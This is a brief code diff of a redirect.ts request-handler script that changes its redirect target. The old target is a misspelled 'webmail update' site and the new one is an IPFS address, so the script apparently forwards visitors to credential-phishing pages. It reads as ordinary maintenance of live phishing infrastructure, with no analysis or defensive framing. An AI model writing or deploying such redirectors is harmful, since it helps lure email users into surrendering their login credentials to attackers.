@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://mywebmailupdatt.framer.website/"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://ipfs.io/ipfs/bafkreigf5tavw2ka35suk4dir342fz73d2xjo7hb4rc2poike45i7tvxpi"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
